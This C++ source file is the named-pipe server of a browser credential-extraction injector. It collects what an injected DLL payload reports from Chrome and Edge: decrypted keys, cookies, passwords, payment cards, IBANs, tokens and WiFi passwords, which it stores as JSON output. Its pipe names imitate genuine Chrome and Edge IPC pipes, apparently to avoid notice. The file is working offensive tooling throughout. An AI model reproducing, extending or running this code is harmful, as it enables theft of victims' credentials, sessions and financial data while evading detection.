// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "pipe_server.hpp"
#include "../core/console.hpp"
#include <iostream>
#include <vector>
#include <algorithm>
#include <sstream>
#include <regex>
#include <fstream>
#include <iomanip>
#include <chrono>

namespace Injector {

    PipeServer::PipeServer(const std::wstring& browserType)
        : m_pipeName(GenerateName(browserType)), m_browserType(browserType) {
    }

    void PipeServer::Create() {
        SECURITY_ATTRIBUTES sa = {};
        sa.nLength = sizeof(sa);
        sa.lpSecurityDescriptor = nullptr;
        sa.bInheritHandle = TRUE;

        m_hPipe.reset(CreateNamedPipeW(m_pipeName.c_str(),
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            1,
            8192,
            8192,
            5000,  // 5 second timeout
            &sa));

        if (!m_hPipe) {
            throw std::runtime_error("");
        }
    }

    void PipeServer::WaitForClient() {
        // With timeout for waiting
        DWORD startTime = GetTickCount();
        const DWORD WAIT_TIMEOUT_MS = 10000;  // 10 seconds to wait for connection

        while (GetTickCount() - startTime < WAIT_TIMEOUT_MS) {
            if (ConnectNamedPipe(m_hPipe.get(), nullptr)) {
                return;  // Successfully connected
            }

            DWORD err = GetLastError();
            if (err == ERROR_PIPE_CONNECTED) {
                return;  // Client was already connected
            }
            if (err != ERROR_PIPE_LISTENING) {
                throw std::runtime_error("");
            }

            Sleep(100);  // Wait a bit before retrying
        }

        throw std::runtime_error("");
    }

    void PipeServer::SendConfig(bool verbose, bool fingerprint, const std::filesystem::path& output, const std::string& version) {
        Write(verbose ? " " : " ");
        Sleep(50);
        Write(fingerprint ? " " : " ");
        Sleep(50);
        Write(output.string());
        Sleep(50);
        Write(Core::ToUtf8(m_browserType));
        Sleep(50);
        Write(version);
        Sleep(50);
        m_outputPath = output.string();
    }

    void PipeServer::Write(const std::string& msg) {
        DWORD written = 0;
        if (!WriteFile(m_hPipe.get(), msg.c_str(), static_cast<DWORD>(msg.length() + 1), &written, nullptr)) {
            throw std::runtime_error(" ");
        }
    }

    std::string PipeServer::EscapeJson(const std::string& s) {
        std::ostringstream o;
        for (char c : s) {
            if (c == '"') o << "\\\"";
            else if (c == '\\') o << "\\\\";
            else if (c == '\n') o << "\\n";
            else if (c == '\r') o << "\\r";
            else if (c == '\t') o << "\\t";
            else if ('\x00' <= c && c <= '\x1f') o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)c;
            else o << c;
        }
        return o.str();
    }

    void PipeServer::ProcessMessages(bool verbose) {
        const std::string completionSignal = "__DLL_PIPE_COMPLETION_SIGNAL__";
        std::string accumulated;
        char buffer[4096];
        bool completed = false;
        DWORD startTime = GetTickCount();

        Core::Console console(verbose);
        m_extraSecretsArray = json::array();

        while (!completed && (GetTickCount() - startTime < Core::TIMEOUT_MS)) {
            DWORD available = 0;
            if (!PeekNamedPipe(m_hPipe.get(), nullptr, 0, nullptr, &available, nullptr)) {
                if (GetLastError() == ERROR_BROKEN_PIPE) break;
                break;
            }

            if (available == 0) {
                Sleep(100);
                continue;
            }

            DWORD read = 0;
            if (!ReadFile(m_hPipe.get(), buffer, sizeof(buffer) - 1, &read, nullptr) || read == 0) {
                if (GetLastError() == ERROR_BROKEN_PIPE) break;
                continue;
            }

            accumulated.append(buffer, read);

            size_t start = 0;
            size_t nullPos;
            while ((nullPos = accumulated.find('\0', start)) != std::string::npos) {
                std::string msg = accumulated.substr(start, nullPos - start);
                start = nullPos + 1;

                if (msg == completionSignal) {
                    completed = true;
                    break;
                }

                // ---- original browser data messages ----
                if (msg.rfind("DEBUG:", 0) == 0) {
                    console.Debug(msg.substr(6));
                }
                else if (msg.rfind("PROFILE:", 0) == 0) {
                    console.ProfileHeader(msg.substr(8));
                    m_stats.profiles++;
                }
                else if (msg.rfind("KEY:", 0) == 0) {
                    console.KeyDecrypted(msg.substr(4));
                }
                else if (msg.rfind("NO_ABE:", 0) == 0) {
                    console.NoAbeWarning(msg.substr(7));
                    m_stats.noAbe = true;
                }
                else if (msg.rfind("ASTER_KEY:", 0) == 0) {
                    console.AsterKeyDecrypted(msg.substr(10));
                }
                else if (msg.rfind("COOKIES:", 0) == 0) {
                    size_t sep = msg.find(':', 8);
                    if (sep != std::string::npos) {
                        int count = std::stoi(msg.substr(8, sep - 8));
                        int total = std::stoi(msg.substr(sep + 1));
                        m_stats.cookies += count;
                        m_stats.cookiesTotal += total;
                        console.ExtractionResult("Cookies", count, total);
                    }
                }
                else if (msg.rfind("PASSWORDS:", 0) == 0) {
                    int count = std::stoi(msg.substr(10));
                    m_stats.passwords += count;
                    console.ExtractionResult("Passwords", count);
                }
                else if (msg.rfind("CARDS:", 0) == 0) {
                    int count = std::stoi(msg.substr(6));
                    m_stats.cards += count;
                    console.ExtractionResult("Cards", count);
                }
                else if (msg.rfind("IBANS:", 0) == 0) {
                    int count = std::stoi(msg.substr(6));
                    m_stats.ibans += count;
                    console.ExtractionResult("IBANs", count);
                }
                else if (msg.rfind("TOKENS:", 0) == 0) {
                    int count = std::stoi(msg.substr(7));
                    m_stats.tokens += count;
                    console.ExtractionResult("Tokens", count);
                }
                else if (msg.rfind("DATA:", 0) == 0) {
                    std::string data = msg.substr(5);
                    size_t sep = data.find('|');
                    if (sep != std::string::npos) {
                        console.DataRow(data.substr(0, sep), data.substr(sep + 1));
                    }
                }
                // ---- extra secrets ----
                else if (msg.rfind("WIFI:", 0) == 0) {
                    size_t sep = msg.find('|', 5);
                    std::string ssid = msg.substr(5, sep - 5);
                    std::string pw = msg.substr(sep + 1);
                    console.Debug("WiFi: " + ssid + " -> " + pw);
                    m_extraSecretsArray.push_back({
                        {"type", "WiFi"},
                        {"ssid", EscapeJson(ssid)},
                        {"password", EscapeJson(pw)},
                        {"browser", m_browserName}
                        });
                }
                else if (msg.rfind("[-]", 0) == 0) {
                    console.Error(msg.substr(4));
                }
                else if (msg.rfind("[!]", 0) == 0) {
                    console.Warn(msg.substr(4));
                }
                else if (verbose && !msg.empty()) {
                    console.Debug(msg);
                }
            }
            accumulated.erase(0, start);
        }

        m_browserData.name = m_browserName;
        m_browserData.cookies = m_stats.cookies;
        m_browserData.cookiesTotal = m_stats.cookiesTotal;
        m_browserData.passwords = m_stats.passwords;
        m_browserData.cards = m_stats.cards;
        m_browserData.ibans = m_stats.ibans;
        m_browserData.tokens = m_stats.tokens;
        m_browserData.profiles = m_stats.profiles;
        m_browserData.noAbe = m_stats.noAbe;
        m_browserData.extraSecrets = m_extraSecretsArray;
    }

    void PipeServer::ProcessMessagesWithConfirmation(bool verbose, bool& success, std::string& errorMessage) {
        const std::string completionSignal = "__DLL_PIPE_COMPLETION_SIGNAL__";
        std::string accumulated;
        char buffer[4096];
        bool completed = false;
        DWORD startTime = GetTickCount();
        success = false;
        errorMessage.clear();

        Core::Console console(verbose);
        m_extraSecretsArray = json::array();

        while (!completed && (GetTickCount() - startTime < Core::TIMEOUT_MS)) {
            DWORD available = 0;
            if (!PeekNamedPipe(m_hPipe.get(), nullptr, 0, nullptr, &available, nullptr)) {
                if (GetLastError() == ERROR_BROKEN_PIPE) break;
                Sleep(50);
                continue;
            }

            if (available == 0) {
                Sleep(100);
                continue;
            }

            DWORD read = 0;
            if (!ReadFile(m_hPipe.get(), buffer, sizeof(buffer) - 1, &read, nullptr) || read == 0) {
                if (GetLastError() == ERROR_BROKEN_PIPE) break;
                Sleep(50);
                continue;
            }

            accumulated.append(buffer, read);

            size_t start = 0;
            size_t nullPos;
            while ((nullPos = accumulated.find('\0', start)) != std::string::npos) {
                std::string msg = accumulated.substr(start, nullPos - start);
                start = nullPos + 1;

                if (msg == completionSignal) {
                    completed = true;
                    break;
                }

                // Handle confirmation messages
                if (msg.rfind("FILE_WRITE_OK:", 0) == 0) {
                    success = true;
                    errorMessage.clear();
                    console.Debug("Payload confirmed file write: " + msg.substr(14));
                    continue;
                }
                else if (msg.rfind("FILE_WRITE_FAIL:", 0) == 0) {
                    success = false;
                    errorMessage = msg.substr(16);
                    console.Error("Payload file write failed: " + errorMessage);
                    continue;
                }

                // All other messages
                if (msg.rfind("DEBUG:", 0) == 0) {
                    console.Debug(msg.substr(6));
                }
                else if (msg.rfind("PROFILE:", 0) == 0) {
                    console.ProfileHeader(msg.substr(8));
                    m_stats.profiles++;
                }
                else if (msg.rfind("KEY:", 0) == 0) {
                    console.KeyDecrypted(msg.substr(4));
                }
                else if (msg.rfind("NO_ABE:", 0) == 0) {
                    console.NoAbeWarning(msg.substr(7));
                    m_stats.noAbe = true;
                }
                else if (msg.rfind("ASTER_KEY:", 0) == 0) {
                    console.AsterKeyDecrypted(msg.substr(10));
                }
                else if (msg.rfind("COOKIES:", 0) == 0) {
                    size_t sep = msg.find(':', 8);
                    if (sep != std::string::npos) {
                        int count = std::stoi(msg.substr(8, sep - 8));
                        int total = std::stoi(msg.substr(sep + 1));
                        m_stats.cookies += count;
                        m_stats.cookiesTotal += total;
                        console.ExtractionResult("Cookies", count, total);
                    }
                }
                else if (msg.rfind("PASSWORDS:", 0) == 0) {
                    int count = std::stoi(msg.substr(10));
                    m_stats.passwords += count;
                    console.ExtractionResult("Passwords", count);
                }
                else if (msg.rfind("CARDS:", 0) == 0) {
                    int count = std::stoi(msg.substr(6));
                    m_stats.cards += count;
                    console.ExtractionResult("Cards", count);
                }
                else if (msg.rfind("IBANS:", 0) == 0) {
                    int count = std::stoi(msg.substr(6));
                    m_stats.ibans += count;
                    console.ExtractionResult("IBANs", count);
                }
                else if (msg.rfind("TOKENS:", 0) == 0) {
                    int count = std::stoi(msg.substr(7));
                    m_stats.tokens += count;
                    console.ExtractionResult("Tokens", count);
                }
                else if (msg.rfind("DATA:", 0) == 0) {
                    std::string data = msg.substr(5);
                    size_t sep = data.find('|');
                    if (sep != std::string::npos) {
                        console.DataRow(data.substr(0, sep), data.substr(sep + 1));
                    }
                }
                else if (msg.rfind("[-]", 0) == 0) {
                    console.Error(msg.substr(4));
                }
                else if (msg.rfind("[!]", 0) == 0) {
                    console.Warn(msg.substr(4));
                }
                else if (verbose && !msg.empty()) {
                    console.Debug(msg);
                }
            }
            accumulated.erase(0, start);
        }

        m_browserData.name = m_browserName;
        m_browserData.cookies = m_stats.cookies;
        m_browserData.cookiesTotal = m_stats.cookiesTotal;
        m_browserData.passwords = m_stats.passwords;
        m_browserData.cards = m_stats.cards;
        m_browserData.ibans = m_stats.ibans;
        m_browserData.tokens = m_stats.tokens;
        m_browserData.profiles = m_stats.profiles;
        m_browserData.noAbe = m_stats.noAbe;
        m_browserData.extraSecrets = m_extraSecretsArray;
    }

    std::string PipeServer::GetBrowserDataAsJson() const {
        json browserJson;
        browserJson["name"] = m_browserName;
        browserJson["extraction_stats"] = {
            {"cookies", m_stats.cookies},
            {"cookies_total", m_stats.cookiesTotal},
            {"passwords", m_stats.passwords},
            {"cards", m_stats.cards},
            {"ibans", m_stats.ibans},
            {"tokens", m_stats.tokens},
            {"profiles", m_stats.profiles},
            {"no_abe", m_stats.noAbe}
        };

        return browserJson.dump(2);
    }

    json PipeServer::GetExtraSecretsJson() const {
        return m_extraSecretsArray;
    }

    std::wstring PipeServer::GenerateName(const std::wstring& browserType) {
        DWORD pid = GetCurrentProcessId();
        DWORD tid = GetCurrentThreadId();
        DWORD tick = GetTickCount();

        DWORD id1 = (pid ^ tick) & 0xFFFF;
        DWORD id2 = (tid ^ (tick >> 16)) & 0xFFFF;
        DWORD id3 = ((pid << 8) ^ tid) & 0xFFFF;

        std::wstring pipeName = L"\\\\.\\pipe\\";
        std::wstring lower = browserType;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);

        wchar_t buffer[128];

        if (lower == L"chrome" || lower == L"chrome-beta") {
            static const wchar_t* patterns[] = {
                L"chrome.sync.%u.%u.%04X",
                L"chrome.nacl.%u_%04X",
                L"mojo.%u.%u.%04X.chrome"
            };
            swprintf_s(buffer, patterns[(id1 + id2) % 3], id1, id2, id3);
        }
        else if (lower == L"edge") {
            static const wchar_t* patterns[] = {
                L"msedge.sync.%u.%u",
                L"msedge.crashpad_%u_%04X",
                L"LOCAL\\msedge_%u"
            };
            swprintf_s(buffer, patterns[(id2 + id3) % 3], id1, id2);
        }
        else {
            swprintf_s(buffer, L"chromium.ipc.%u.%u", id1, id2);
        }

        pipeName += buffer;
        return pipeName;
    }

}  // namespace Injector
